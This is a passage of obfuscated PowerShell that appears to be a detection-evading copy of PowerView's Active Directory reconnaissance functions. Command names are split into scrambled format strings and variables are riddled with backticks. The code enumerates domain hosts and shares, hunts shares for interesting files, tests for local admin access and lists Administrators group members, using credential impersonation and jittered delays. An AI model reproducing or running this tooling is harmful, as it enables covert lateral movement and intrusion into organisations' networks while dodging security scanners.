                ${nU`ll} = &("{0}{1}{3}{4}{5}{2}" -f 'Invoke','-U','rsonation','serIm','p','e') -TokenHandle ${t`OkeNH`A`NDle} -Quiet
            }

            ForEach (${tAr`ge`TcOMp`Uter} in ${C`oMP`Uter`NamE}) {

                ${sEa`R`cHshAR`Es} = @()
                if (${t`ARGEtcOmPu`T`eR}.("{2}{0}{1}"-f 'rtsWi','th','Sta').Invoke('\\')) {
                    
                    ${SEArch`s`h`ArES} += ${TargetCoM`P`UteR}
                }
                else {
                    ${Up} = &("{0}{1}{2}{3}{4}" -f 'Te','s','t-Con','nect','ion') -Count 1 -Quiet -ComputerName ${TARgET`cOmpU`T`eR}
                    if (${u`P}) {
                        
                        ${Sh`A`REs} = &("{3}{1}{0}{2}"-f'har','t-NetS','e','Ge') -ComputerName ${TARge`TcOmP`Ut`eR}
                        ForEach (${SH`A`Re} in ${sH`A`ReS}) {
                            ${S`hAReNA`ME} = ${sH`ARE}."Na`mE"
                            ${P`AtH} = '\\'+${Tar`GEtco`mP`Uter}+'\'+${s`hArE`NaME}
                            
                            if ((${s`h`ArEN`Ame}) -and (${s`Har`ena`me}.("{0}{1}" -f 'Tr','im').Invoke() -ne '')) {
                                
                                if (${e`XcLud`edShAR`ES} -NotContains ${S`HArEn`AmE}) {
                                    
                                    try {
                                        ${NU`Ll} =  (GET-varIAbLE ('G'+'1Eup')  -VAL )::("{1}{2}{0}"-f's','GetF','ile').Invoke(${PA`Th})
                                        ${SeA`R`CHshAr`eS} += ${p`ATh}
                                    }
                                    catch {
                                        &("{2}{3}{1}{0}" -f'ose','Verb','Wr','ite-') ('[!]'+' '+'No'+' '+'a'+'ccess '+'t'+'o '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${shA`RE} in ${s`EaRchsh`ArES}) {
                    &("{1}{0}{4}{2}{3}"-f'r','W','te-Verbo','se','i') ('S'+'earch'+'ing'+' '+'s'+'hare: '+"$Share")
                    ${SeA`RC`Hargs} = @{
                        ("{1}{0}"-f 'th','Pa') = ${sH`Are}
                        ("{1}{2}{0}" -f'clude','I','n') = ${incl`Ude}
                    }
                    if (${of`FicEDO`Cs}) {
                        ${S`eA`Rc`HaRgs}[("{3}{2}{1}{0}"-f'cs','ceDo','ffi','O')] = ${ofFI`cED`OCS}
                    }
                    if (${frE`sh`EXes}) {
                        ${S`eaR`chargS}[("{0}{2}{1}" -f'FreshE','Es','X')] = ${f`ReSH`eX`es}
                    }
                    if (${L`A`staccEsST`ime}) {
                        ${sEAr`ch`ArGs}[("{1}{0}{3}{2}"-f 'tA','Las','sTime','cces')] = ${L`As`T`AC`CeSstime}
                    }
                    if (${LaS`Tw`RiTe`TIMe}) {
                        ${s`EaRc`HARGS}[("{1}{0}{2}" -f 'e','LastWrit','Time')] = ${L`AS`TW`RIt`etimE}
                    }
                    if (${cre`Atio`NTimE}) {
                        ${SEarCH`AR`Gs}[("{1}{0}{2}{3}"-f'e','Cr','ation','Time')] = ${cre`A`TioNTI`me}
                    }
                    if (${cHE`CKW`RITEaCCe`Ss}) {
                        ${SeArc`HAr`gs}[("{1}{0}{4}{5}{2}{3}" -f 'W','Check','es','s','riteAc','c')] = ${cHECkWr`I`TEAcc`eSs}
                    }
                    &("{3}{5}{4}{0}{1}{2}" -f 'st','in','gFile','F','nd-Intere','i') @SearchArgs
                }
            }

            if (${To`KenH`AnDLe}) {
                &("{3}{4}{1}{0}{2}{5}"-f 'tToS','r','e','I','nvoke-Reve','lf')
            }
        }

        ${logo`N`To`kEn} = ${nU`lL}
        if (${P`SBou`NdpArAMeT`eRS}[("{2}{0}{1}{3}"-f'red','entia','C','l')]) {
            if (${ps`BOUNdP`AraMe`TErS}[("{1}{0}" -f'elay','D')] -or ${P`sBoundpA`RameTe`RS}[("{0}{2}{1}"-f 'Sto','nSuccess','pO')]) {
                ${loGON`TO`K`en} = &("{1}{4}{3}{0}{2}"-f'nati','In','on','so','voke-UserImper') -Credential ${cr`EdEn`TIal}
            }
            else {
                ${lo`GO`NTOkEn} = &("{1}{2}{0}{4}{3}" -f 's','Inv','oke-U','Impersonation','er') -Credential ${c`ReDE`NTiAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PS`B`OUndpA`RAMeTE`Rs}[("{1}{0}" -f 'y','Dela')] -or ${PsBO`UnDP`A`RaMEtE`RS}[("{1}{2}{3}{0}" -f'nSuccess','S','t','opO')]) {

            &("{0}{1}{2}" -f'W','rite-Verbo','se') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{0}{3}{2}{1}"-f 'W','ose','b','rite-Ver') ('[F'+'ind-In'+'ter'+'esti'+'ngDomai'+'n'+'S'+'h'+'areF'+'i'+'le] '+'D'+'elay: '+"$Delay, "+'Jitter:'+' '+"$Jitter")
            ${CoUN`T`eR} = 0
            ${r`AnDnO} = &("{0}{2}{1}" -f 'N','bject','ew-O') ("{1}{2}{3}{0}{4}" -f '.Rando','Sy','ste','m','m')

            ForEach (${taRGEtcOmP`U`T`ER} in ${T`Arg`eTC`OMPu`TeRs}) {
                ${cOun`TER} = ${c`o`UntEr} + 1

                
                &("{2}{0}{1}"-f 't-Sl','eep','Star') -Seconds ${RAn`dNO}.("{0}{1}"-f 'Nex','t').Invoke((1-${Ji`T`TER})*${DE`lay}, (1+${j`i`TTer})*${D`eLAy})

                &("{1}{2}{3}{0}"-f 'rbose','Wr','ite-','Ve') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{1}{4}{3}{2}"-f 'Invok','e-C','and','mm','o') -ScriptBlock ${hOs`TEn`Umbl`oCK} -ArgumentList ${TARgeTc`o`M`pUTeR}, ${iNcl`U`DE}, ${ExCl`U`DedShar`es}, ${off`ice`dOcS}, ${ExCLU`d`eh`idDen}, ${F`ReshE`XeS}, ${c`H`eCk`WR`IteACCeSS}, ${lo`GONTok`eN}
            }
        }
        else {
            &("{3}{4}{1}{0}{2}" -f 'e','V','rbose','Write','-') ('[Find'+'-'+'Int'+'er'+'es'+'tingDo'+'main'+'Shar'+'eF'+'i'+'le] '+'Usi'+'ng'+' '+'thr'+'e'+'ad'+'ing '+'with'+' '+'thread'+'s: '+"$Threads")

            
            ${scRip`TPar`AmS} = @{
                ("{0}{1}" -f 'Includ','e') = ${INCl`U`de}
                ("{4}{1}{2}{0}{3}" -f'are','clu','dedSh','s','Ex') = ${EX`CL`UDeDSh`ARES}
                ("{1}{0}{2}"-f'ffi','O','ceDocs') = ${o`FfI`ced`OcS}
                ("{0}{3}{2}{1}"-f'Exc','en','eHidd','lud') = ${EXC`lUd`e`hIdDen}
                ("{0}{2}{1}" -f'F','eshEXEs','r') = ${F`ReShE`xeS}
                ("{1}{3}{2}{0}"-f 'Access','Che','kWrite','c') = ${c`He`cK`WR`iT`EaccESS}
                ("{2}{0}{1}"-f 'kenHa','ndle','To') = ${lo`gont`OKeN}
            }

            
            &("{3}{4}{0}{5}{2}{1}"-f'adedFu','tion','c','N','ew-Thre','n') -ComputerName ${tAR`g`et`CoM`PUters} -ScriptBlock ${h`OStE`NuMBLo`CK} -ScriptParameters ${Sc`RIPtPAr`A`mS} -Threads ${thR`e`ADs}
        }
    }

    END {
        if (${l`o`gOntokeN}) {
            &("{2}{3}{1}{0}"-f 'lf','e-RevertToSe','In','vok') -TokenHandle ${L`OG`onto`keN}
        }
    }
}


function fINd-LoCalA`DM`I`Nacc`Ess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{4}{3}"-f 'S','h','PS','Process','ould'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(PosItIon = 0, vALuefRoMPIpEline = ${tR`UE}, VaLUefroMpiPelinebypropErtyNaME = ${tR`Ue})]
        [Alias({"{1}{2}{0}" -f 'ame','DNS','HostN'})]
        [String[]]
        ${c`oMP`UtERn`A`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMpUTErD`O`MaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mPUteRlD`Ap`F`iltER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOm`P`Uter`S`EArCH`BA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}" -f 'ngSy','i','Operat','stem'})]
        [String]
        ${CoM`puT`erO`PERAt`inGs`YSt`eM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}" -f 'k','rv','icePac','Se'})]
        [String]
        ${C`Ompu`TERsERv`icE`pACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'Sit','ame','eN'})]
        [String]
        ${Co`mP`U`Ters`ItEnA`ME},

        [Switch]
        ${c`hEcKSH`AREA`cCesS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{4}{0}{1}{3}{2}"-f 'o','ntr','ler','ol','inC','Doma'})]
        [String]
        ${S`E`RvEr},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{1}{0}" -f'vel','OneLe'}, {"{0}{2}{1}" -f'Subt','e','re'})]
        [String]
        ${S`EArChs`Co`Pe} = ("{1}{0}{2}" -f 'ubtr','S','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`e`sU`lT`pAGesizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRver`Ti`mElIM`It},

        [Switch]
        ${TOMB`sTO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDENT`IaL} =  ${q`FN}::"E`mPtY",

        [ValidateRange(1, 10000)]
        [Int]
        ${De`Lay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`I`TTER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${TH`ReA`Ds} = 20
    )

    BEGIN {
        ${C`O`mpUtE`R`SE`ARc`hErARguMEnTs} = @{
            ("{0}{1}{2}" -f'Pr','operti','es') = ("{2}{0}{1}"-f 'host','name','dns')
        }
        if (${PS`BoundpAR`AM`eTErS}[("{3}{1}{0}{2}" -f'rDo','ute','main','Comp')]) { ${Co`mPu`TeRSE`ARchera`RgUmenTs}[("{1}{0}"-f 'n','Domai')] = ${Co`M`pU`T`erDOMAIn} }
        if (${psBou`N`d`PARaMETE`Rs}[("{1}{3}{2}{5}{0}{4}"-f 'il','Com','LD','puter','ter','APF')]) { ${COM`pUt`ErSeAr`c`Her`Arg`UmE`NTS}[("{3}{2}{1}{0}" -f'r','te','l','LDAPFi')] = ${co`m`PUtERlDApfIl`Ter} }
        if (${P`sb`o`UNDpAra`m`eTErS}[("{4}{0}{3}{2}{1}"-f'ter','e','s','SearchBa','Compu')]) { ${coMPu`T`e`RSE`ARchE`RaRG`UMeNTs}[("{0}{1}{2}" -f'SearchB','as','e')] = ${coMp`U`Te`R`S`earChbase} }
        if (${pSbOUN`D`PA`RAmEteRS}[("{3}{0}{2}{1}"-f'n','ned','strai','Unco')]) { ${compu`TEr`Sea`R`ch`erargU`meNTs}[("{0}{3}{2}{4}{1}"-f'Unconstr','ed','i','a','n')] = ${uNCoNS`TRA`IN`ed} }
        if (${PsbOuNdpar`A`me`TerS}[("{0}{4}{6}{2}{3}{5}{1}" -f 'ComputerOp','m','g','Sys','er','te','atin')]) { ${C`omP`U`T`ERs`e`ARCHeR`ARgUm`eNTs}[("{2}{3}{0}{1}" -f 'yste','m','Operati','ngS')] = ${OP`eRAT`I`Ngsys`TeM} }
        if (${PSbo`Und`p`ARam`etERS}[("{0}{4}{1}{3}{2}{5}"-f 'Com','uterServic','P','e','p','ack')]) { ${cOMPUTeRse`Ar`chER`ArGum`enTS}[("{2}{3}{0}{1}" -f'c','k','Servi','cePa')] = ${sER`V`I`CEpACK} }
        if (${PsBoundPa`R`A`M`e`TErs}[("{0}{1}{3}{2}"-f 'C','om','teName','puterSi')]) { ${C`omPU`TERsea`Rc`HERaRGU`mEn`Ts}[("{0}{2}{1}" -f'Si','e','teNam')] = ${SI`T`E`NaMe} }
        if (${p`SbOu`NdParAMe`T`eRS}[("{1}{2}{0}" -f'ver','Se','r')]) { ${COMPUt`ER`SEAR`ChERaR`GUme`NtS}[("{1}{0}"-f'ver','Ser')] = ${s`eRV`er} }
        if (${pSBoUN`dPaRaMe`Te`Rs}[("{2}{0}{1}{3}"-f 'r','c','Sea','hScope')]) { ${coM`pU`TErse`ARCHEr`Ar`gUME`NTs}[("{2}{0}{1}" -f 'earchSco','pe','S')] = ${SEar`C`H`sCope} }
        if (${p`SB`O`UndParaME`Te`Rs}[("{0}{1}{3}{2}"-f'Re','sul','ze','tPageSi')]) { ${CO`mPutE`R`SearCHERarguMe`NtS}[("{1}{4}{2}{3}{0}" -f 'e','Resu','ageSi','z','ltP')] = ${reSULtpag`e`siZe} }
        if (${p`S`BOunDPar`AmET`erS}[("{4}{1}{0}{3}{2}"-f 'meLi','erverTi','it','m','S')]) { ${C`O`mPUter`SeaRCH`E`RaRgumeNTS}[("{0}{3}{2}{1}" -f 'ServerTimeLi','t','i','m')] = ${serVErt`iM`El`imiT} }
        if (${p`SBOUnDpARAmE`TE`Rs}[("{2}{0}{1}" -f 'b','stone','Tom')]) { ${Co`m`pUTErS`E`ARcHErA`Rgum`E`NTs}[("{0}{1}{2}"-f 'Tom','bs','tone')] = ${To`M`BStOnE} }
        if (${p`sb`Ou`NdPaRaMeters}[("{1}{0}{2}{3}"-f 'e','Cred','nti','al')]) { ${cOMpU`T`erSeA`R`CheRaRGu`mENtS}[("{0}{2}{1}" -f 'Cred','al','enti')] = ${Cr`ED`eNTI`AL} }

        if (${PsboU`NdP`ARA`m`eTE`RS}[("{0}{1}{2}" -f'Comp','uterNam','e')]) {
            ${t`ARG`Et`Comp`UTERS} = ${COMp`U`TErnAmE}
        }
        else {
            &("{0}{2}{1}"-f'Write-Ver','se','bo') ("{6}{7}{4}{0}{3}{8}{5}{1}{2}"-f 'Access] Quer','ters in the doma','in','yi','n',' compu','[Find-Loca','lAdmi','ng')
            ${Ta`RgetCO`MpU`T`eRS} = &("{2}{4}{3}{0}{1}"-f 'Compu','ter','Get-Do','in','ma') @ComputerSearcherArguments | &("{0}{1}{2}" -f'Selec','t-O','bject') -ExpandProperty ("{1}{2}{0}"-f'ame','dnsh','ostn')
        }
        &("{4}{2}{0}{1}{3}" -f 'erb','os','rite-V','e','W') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${TArGe`TC`o`MpuTERs}."le`NgTH" -eq 0) {
            throw ("{1}{12}{8}{5}{9}{10}{11}{2}{7}{14}{0}{3}{13}{6}{4}"-f'un','[F','host','d ','rate','cce','nume','s f','AdminA','ss] ','No',' ','ind-Local','to e','o')
        }

        
        ${hoStE`NUmbLo`Ck} = {
            Param(${cOm`p`UterNaME}, ${TO`K`eNHAnd`LE})

            if (${tOk`eN`H`AndLE}) {
                
                ${Nu`lL} = &("{4}{0}{6}{1}{5}{3}{2}"-f 'vok','UserIm','n','o','In','personati','e-') -TokenHandle ${ToKENHA`N`D`Le} -Quiet
            }

            ForEach (${T`Ar`GeTC`o`MPuTer} in ${com`puTE`RNa`ME}) {
                ${Up} = &("{0}{2}{3}{1}"-f 'Test-Con','n','necti','o') -Count 1 -Quiet -ComputerName ${TaR`G`EtcOM`pUTer}
                if (${U`P}) {
                    
                    ${ac`ce`sS} = &("{4}{2}{3}{1}{0}" -f 'ess','inAcc','est','-Adm','T') -ComputerName ${tARg`etCom`pu`T`ER}
                    if (${Acc`ESs}."i`sa`DmIN") {
                        ${taRGetCO`M`PUt`ER}
                    }
                }
            }

            if (${t`OkENHa`NDLE}) {
                &("{2}{1}{3}{4}{5}{0}" -f'lf','-Reve','Invoke','rt','To','Se')
            }
        }

        ${L`OgOnt`OKEn} = ${N`ULl}
        if (${P`Sb`ou`NDPARaMEte`RS}[("{0}{2}{1}" -f'C','l','redentia')]) {
            if (${psbouND`P`ARaMe`TErS}[("{1}{0}"-f 'y','Dela')] -or ${p`SB`OU`NdpArAMe`TerS}[("{1}{3}{2}{0}" -f 'ess','StopO','ucc','nS')]) {
                ${LoGO`N`Token} = &("{0}{4}{6}{2}{5}{1}{3}" -f'In','natio','rImpe','n','vok','rso','e-Use') -Credential ${c`ReDeNTi`AL}
            }
            else {
                ${L`o`G`oNtOken} = &("{3}{4}{0}{1}{2}" -f'm','person','ation','Invo','ke-UserI') -Credential ${cRED`e`NT`iaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PSBO`UnDpaRa`Me`TErs}[("{1}{0}"-f'elay','D')] -or ${psbO`UNDP`Ara`m`EteRS}[("{1}{3}{2}{0}{4}"-f'S','St','pOn','o','uccess')]) {

            &("{0}{3}{2}{1}" -f 'Writ','e','s','e-Verbo') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{4}{1}{3}{0}{2}" -f'erbo','te','se','-V','Wri') ('[Fi'+'nd-L'+'ocalA'+'dm'+'inAc'+'c'+'ess] '+'De'+'lay:'+' '+"$Delay, "+'Jit'+'ter:'+' '+"$Jitter")
            ${co`UNT`Er} = 0
            ${RA`ND`No} = &("{2}{1}{0}" -f'Object','w-','Ne') ("{2}{0}{1}" -f'stem.','Random','Sy')

            ForEach (${TA`Rge`T`co`MPUtER} in ${ta`R`Getco`M`pUtERs}) {
                ${COuN`TEr} = ${c`ouNteR} + 1

                
                &("{2}{1}{0}{3}"-f't-S','r','Sta','leep') -Seconds ${r`AND`NO}.("{1}{0}" -f 'xt','Ne').Invoke((1-${ji`TteR})*${dE`L`AY}, (1+${jitT`eR})*${DE`LAY})

                &("{1}{3}{0}{2}" -f '-V','Wri','erbose','te') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{4}{2}{3}{0}{1}" -f'mm','and','voke','-Co','In') -ScriptBlock ${ho`stE`Nu`mBL`ocK} -ArgumentList ${ta`RGeTco`m`pU`TEr}, ${lo`g`ONto`kEn}
            }
        }
        else {
            &("{2}{4}{0}{1}{3}" -f'e-Ver','bo','Wr','se','it') ('[Fi'+'nd'+'-'+'Lo'+'ca'+'lAdmi'+'nAccess] '+'U'+'sing '+'t'+'hre'+'ading '+'wit'+'h '+'th'+'r'+'eads:'+' '+"$Threads")

            
            ${s`CRi`ptpa`RAMS} = @{
                ("{0}{1}{2}{3}"-f'TokenH','and','l','e') = ${LOG`ONtoK`En}
            }

            
            &("{2}{4}{3}{1}{0}" -f 'tion','nc','New-Thr','dFu','eade') -ComputerName ${tArGetCo`m`pUt`ers} -ScriptBlock ${hos`T`eNUmBLOck} -ScriptParameters ${SCR`ip`TPa`RaMS} -Threads ${THr`eAds}
        }
    }
}


function FI`Nd-D`O`mAINlOcaL`gR`oUPMEmBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f 's','PSShouldPr','s','oce'}, '')]
    [OutputType({"{1}{6}{2}{3}{5}{0}{7}{8}{4}"-f'LocalGro','Power','i','ew','.API','.','V','upMemb','er'})]
    [OutputType({"{1}{3}{0}{4}{5}{2}{7}{6}"-f'rVie','Pow','.Wi','e','w.Local','GroupMember','T','nN'})]
    Param(
        [Parameter(POSiTioN = 0, vaLUefroMpIPeLInE = ${T`RUe}, VAlUEfrompiPELinebYPropErtyNAme = ${T`RUE})]
        [Alias({"{1}{0}{2}" -f'os','DNSH','tName'})]
        [String[]]
        ${C`OMpUtE`RName},

        [ValidateNotNullOrEmpty()]
        [String]
        ${comPut`eR`d`OmAin},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`ompuTeR`ldAPFi`ltEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMpUTeR`SeaR`cHb`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}"-f 'ste','m','eratingSy','Op'})]
        [String]
        ${c`oMpU`TEropeRaTING`SY`St`Em},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'Servi','c','ePack'})]
        [String]
        ${c`ompUteR`S`ERViCEpa`Ck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'Name','Si','te'})]
        [String]
        ${co`m`put`ErSi`TENaMe},

        [Parameter(VALUEFrOMPiPeLiNEBYpRopERtYNAMe = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${g`ROu`pNAMe} = ("{2}{0}{1}{3}"-f 'nis','tra','Admi','tors'),

        [ValidateSet('API', {"{1}{0}" -f 'T','WinN'})]
        [Alias({"{3}{0}{4}{1}{2}"-f 'le','on','Method','Col','cti'})]
        [String]
        ${mET`h`od} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}" -f'er','mainControll','o','D'})]
        [String]
        ${S`eR`VER},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{1}{0}{2}" -f'eLeve','On','l'}, {"{1}{2}{0}"-f 'ree','S','ubt'})]
        [String]
        ${Se`A`RChs`CoPE} = ("{1}{0}" -f 'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESUlT`p`AgE`S`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRver`TiM`ElImit},

        [Switch]
        ${T`oMBsT`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`ENt`ial} =   (  VARIaBLE  ("{1}{0}"-f 'N','Qf') )."val`UE"::"EmP`TY",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`elaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jit`T`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tHR`E`Ads} = 20
    )

    BEGIN {
        ${ComPUTe`R`sea`R`CHERaR`G`UmeN`Ts} = @{
            ("{1}{3}{0}{2}" -f'ie','Pro','s','pert') = ("{0}{1}{2}"-f 'dns','hostn','ame')
        }
        if (${PS`BO`UNdpa`RAmETerS}[("{2}{1}{0}{3}"-f 'oma','omputerD','C','in')]) { ${cOMP`UTE`RseA`RC`herARgUmENts}[("{1}{0}" -f'omain','D')] = ${C`O`mPu`TERdomain} }
        if (${Ps`B`OU`NdP`ArAME`TERS}[("{2}{3}{1}{4}{0}"-f 'ter','erLDAPFi','C','omput','l')]) { ${Comp`UT`eRsEARCh`E`RAr`Gu`ME`NTs}[("{0}{1}{2}" -f'LDA','PFilte','r')] = ${ComPutE`RLDA`pFILT`Er} }
        if (${Psb`OunDpaRaM`e`T`ERs}[("{3}{1}{4}{0}{2}" -f'earc','ter','hBase','Compu','S')]) { ${coMpUtEr`SeA`RC`h`ErArgUmentS}[("{1}{2}{0}"-f 'Base','Searc','h')] = ${c`OM`PuterS`EAR`cH`Ba`SE} }
        if (${P`sb`OuNDPAR`AmE`Ters}[("{1}{0}{2}" -f 'nconstraine','U','d')]) { ${Co`mPUt`erSEAr`c`h`eRa`R`gUM`eNtS}[("{0}{2}{1}"-f 'Unconstrain','d','e')] = ${UN`Co`NS`TRAI`NED} }
        if (${Psbo`Undp`ARAMET`erS}[("{2}{5}{0}{1}{3}{4}{6}"-f'terOper','a','Co','ti','ngSyste','mpu','m')]) { ${COMpUtE`RsEarChER`ARGu`mEn`TS}[("{2}{0}{1}{3}" -f 'gS','yst','Operatin','em')] = ${op`ErAt`i`N`GSYsTem} }
        if (${ps`BOuND`PA`RAMEteRs}[("{3}{2}{0}{4}{1}" -f'erv','ePack','omputerS','C','ic')]) { ${co`MputerseA`Rch`E`RaRgumen`Ts}[("{2}{3}{1}{0}" -f 'Pack','vice','S','er')] = ${SeRv`i`CePACk} }
        if (${PSBO`UnDpA`R`AmEt`eRs}[("{0}{1}{2}"-f'Computer','SiteNam','e')]) { ${co`mP`UteRs`eArC`H`er`Ar`guMEntS}[("{0}{2}{1}" -f'S','ame','iteN')] = ${SiT`E`NAmE} }
        if (${PsB`ound`p`ArAmE`TeRS}[("{1}{0}{2}"-f 'r','Se','ver')]) { ${C`O`m`PUt`E`RS`EaRChERA`RgUMEN`TS}[("{1}{0}"-f'r','Serve')] = ${s`eRvEr} }
        if (${pSBoundpA`Ra`mE`T`ERS}[("{0}{1}{2}"-f 'Searc','hS','cope')]) { ${cOmPut`e`RS`E`AR`Ch`eRaRgU`mEnTS}[("{0}{1}{2}" -f'Searc','hSco','pe')] = ${Sea`Rc`h`scOpE} }
        if (${pSbOUnD`par`AmETe`Rs}[("{0}{3}{2}{1}" -f 'ResultPa','e','z','geSi')]) { ${coM`pUT`ersEAr`CH`ErArgU`meNTS}[("{3}{0}{4}{2}{1}"-f's','eSize','g','Re','ultPa')] = ${rEsulTP`A`GeSi`ZE} }
        if (${psbo`UnDp`AR`AM`ETE`Rs}[("{2}{0}{3}{1}{4}"-f'imeL','mi','ServerT','i','t')]) { ${cOMPUT`eRsE`Arche`RaRGU`MenTs}[("{2}{0}{1}"-f'imeLi','mit','ServerT')] = ${SE`RverTi`ME`LI`MIt} }
        if (${psbOu`NDPaR`AM`eTE`RS}[("{2}{0}{1}"-f 'ombston','e','T')]) { ${com`pUte`RsE`ArchER`ARgUmENtS}[("{0}{1}{2}"-f 'Tombs','t','one')] = ${tO`mbST`ONE} }
        if (${pSbounDp`A`RAM`EtERS}[("{1}{3}{0}{2}"-f'd','Cr','ential','e')]) { ${C`oMPU`T`eRsEARc`Her`ArGU`MeNts}[("{2}{0}{1}{3}" -f't','i','Creden','al')] = ${CR`e`DE`NtiAL} }

        if (${PSbOuNDp`ArA`MET`Ers}[("{0}{2}{1}" -f'Compute','e','rNam')]) {
            ${t`A`R`gEtCOmp`UTErs} = ${cO`MP`Uter`Na`mE}
        }
        else {
            &("{1}{0}{2}"-f 'e-Ve','Writ','rbose') ("{4}{9}{11}{8}{10}{2}{1}{7}{0}{3}{6}{5}"-f 'er] Query','m','oupMe','ing comp','[Fin','rs in the domain','ute','b','lG','d-Domai','r','nLoca')
            ${taRgeTC`O`mPu`TE`Rs} = &("{0}{1}{3}{4}{2}"-f 'G','et-Dom','ter','ainC','ompu') @ComputerSearcherArguments | &("{1}{0}{2}"-f 'Ob','Select-','ject') -ExpandProperty ("{2}{1}{0}" -f'stname','ho','dns')
        }
        &("{4}{0}{1}{2}{3}" -f'r','it','e-Verbo','se','W') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${TaR`Get`Co`MP`UtERS}."L`eNgTH" -eq 0) {
            throw ("{6}{2}{7}{8}{9}{5}{4}{1}{0}{3}"-f 't','ound ','ind-Domain','o enumerate','] No hosts f','ber','[F','Loca','lGr','oupMem')
        }

        
        ${HOST`Enu`MbL`Ock} = {
            Param(${COMp`UtE`R`NaMe}, ${GrOUpn`A`me}, ${MEt`h`OD}, ${TOke`NHAn`D`le})

            
            if (${Gr`O`UPnamE} -eq ("{2}{0}{1}{3}{4}" -f'dm','in','A','istrat','ors')) {
                ${admin`SeCu`RIT`YI`DENtIf`i`er} = &("{1}{2}{0}" -f 'ct','New-Obj','e') ("{2}{4}{1}{6}{11}{3}{5}{7}{10}{9}{0}{8}"-f 'entifie','Pr','S','p','ystem.Security.','al.','inc','Securit','r','d','yI','i')( ( DIr ("{3}{0}{2}{1}" -f 'iaBlE','ZE',':1','VAr') )."v`ALUE"::"BU`iLT`inaDm`INIsTraT`oRss`id",${Nu`lL})
                ${GR`ouPnA`me} = (${Admi`N`seCUrIty`id`eNtif`IeR}."tr`AN`S`latE"([System.Security.Principal.NTAccount])."Va`lUE" -split "\\")[-1]
            }

            if (${tOKenHA`N`DLe}) {
                
                ${n`ULL} = &("{1}{6}{5}{4}{3}{0}{2}"-f'i','Invoke','on','t','ona','mpers','-UserI') -TokenHandle ${TOk`eNhA`N`dLE} -Quiet
            }

            ForEach (${Ta`RGETCOm`PUtER} in ${C`Om`pUTeRN`A`mE}) {
                ${UP} = &("{1}{3}{0}{2}" -f'ti','Test-Conne','on','c') -Count 1 -Quiet -ComputerName ${taR`GEt`Comp`UT`er}
                if (${up}) {
                    ${n`eTl`OCal`GrOUp`MeMbERa`R`g`Um`enTS} = @{
                        ("{1}{2}{0}" -f'ame','Computer','N') = ${T`ArgEtcomPU`T`ER}
                        ("{1}{0}{2}"-f't','Me','hod') = ${m`Eth`OD}
                        ("{0}{2}{1}"-f 'GroupN','me','a') = ${G`ROUpn`Ame}
                    }
                    &("{2}{3}{1}{6}{5}{0}{4}"-f 'lGro','t-N','G','e','upMember','a','etLoc') @NetLocalGroupMemberArguments
                }
            }

            if (${tO`KeN`h`Andle}) {
                &("{1}{2}{3}{0}{4}" -f 'Rever','In','v','oke-','tToSelf')
            }
        }

        ${LOGO`N`To`ken} = ${nU`lL}
        if (${PsBouNDPAR`Am`et`e`RS}[("{0}{1}{3}{2}"-f'Creden','t','l','ia')]) {
            if (${PS`BoU`NDpA`Ram`Et`ERs}[("{0}{1}"-f'De','lay')] -or ${psB`oUN`DPArAMEt`ERS}[("{3}{1}{0}{2}"-f 'nSucc','opO','ess','St')]) {
                ${LOg`Ontok`EN} = &("{5}{1}{6}{4}{0}{3}{2}"-f'at','nvoke-Use','on','i','on','I','rImpers') -Credential ${c`Re`dENTIAL}
            }
            else {
                ${Lo`G`oNtokeN} = &("{0}{1}{3}{2}{4}"-f 'Invo','ke-UserIm','ersonatio','p','n') -Credential ${crEDEn`T`I`Al} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${p`SB`OundPaRA`MEtE`RS}[("{0}{1}" -f'Dela','y')] -or ${p`SboUnD`p`Arame`T`ERS}[("{1}{0}{2}{3}" -f'pO','Sto','nSu','ccess')]) {

            &("{3}{2}{1}{0}"-f'rbose','Ve','e-','Writ') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
